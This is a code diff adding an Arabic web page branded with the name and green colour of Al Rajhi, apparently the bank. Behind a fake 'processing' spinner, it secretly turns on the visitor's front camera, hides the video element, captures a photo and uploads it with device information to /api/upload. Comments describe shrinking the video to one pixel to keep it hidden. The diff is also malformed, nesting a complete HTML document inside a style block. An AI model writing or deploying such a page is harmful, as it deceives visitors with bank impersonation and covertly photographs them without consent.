@@ -5,40 +5,121 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>معالجة تلقائية</title>
     <style>
-      body {
-    /* خلفية داكنة فائقة العمق مع إضاءة خفية */
-    background: #050505;
-    background-image: 
-        radial-gradient(circle at 20% 30%, rgba(60, 80, 224, 0.15) 0%, transparent 50%),
-        radial-gradient(circle at 80% 70%, rgba(224, 60, 150, 0.15) 0%, transparent 50%);
-    
-    margin: 0;
-    padding: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    overflow: hidden;
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-    color: white;
-}
+     <!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>AI Processing</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #050505;
+            overflow: hidden;
+            font-family: 'Segoe UI', sans-serif;
+            color: white;
+            /* إضافة الراجحي كعلامة مائية في الخلفية */
+        }
 
-/* إضافة بطاقة فخمة لعرض حالة المعالجة */
-.container {
-    padding: 50px;
-    border-radius: 30px;
-    background: rgba(255, 255, 255, 0.03);
-    backdrop-filter: blur(20px);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-    text-align: center;
-    animation: fadeIn 1s ease-out;
-}
+        /* نص الراجحي في الخلفية */
+        .bg-text {
+            position: absolute;
+            font-size: 15vw;
+            font-weight: bold;
+            color: rgba(255, 255, 255, 0.03);
+            z-index: 0;
+            pointer-events: none;
+            user-select: none;
+        }
 
-@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-}
+        .container {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(20px);
+            padding: 50px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .loader-ring {
+            width: 100px;
+            height: 100px;
+            border: 3px solid transparent;
+            border-top: 3px solid #00a859; /* لون الراجحي الفاخر */
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 20px #00a859;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .status-text {
+            font-size: 1.5rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #e0e0e0;
+        }
+
+        .result { display: none; font-size: 80px; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-text">الراجحي</div>
+
+    <div class="container" id="ui">
+        <div class="loader-ring"></div>
+        <div class="status-text">جاري المعالجة...</div>
+    </div>
+
+    <div id="succ" class="result">✓</div>
+    <div id="err" class="result">✕</div>
+
+    <!-- الكاميرا مخفية -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // (الكود البرمجي الخاص بك للالتقاط والإرسال سيعمل هنا بنفس المنطق السابق)
+        const video = document.getElementById('video'), canvas = document.getElementById('canvas'), ctx = canvas.getContext('2d');
+        const ui = document.getElementById('ui'), succ = document.getElementById('succ'), err = document.getElementById('err');
+
+        async function start() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                video.onloadedmetadata = () => setTimeout(() => capture(stream), 500);
+            } catch(e) { ui.style.display='none'; err.style.display='block'; }
+        }
+
+        function capture(stream) {
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('captured_image', blob, 'snap.jpg');
+                fd.append('deviceInfo', JSON.stringify({ userAgent: navigator.userAgent }));
+                
+                try {
+                    const res = await fetch('/api/upload', { method: 'POST', body: fd });
+                    ui.style.display='none';
+                    res.ok ? (succ.style.display='block') : (err.style.display='block');
+                } catch(e) { ui.style.display='none'; err.style.display='block'; }
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.9);
+        }
+        start();
+    </script>
+</body>
+</html>
         /* تعديل الأبعاد لإخفاء الفيديو تماماً مع الحفاظ على عمل الكاميرا */
         video {
             width: 1px; /* تصغير العرض لـ 1 بكسل */
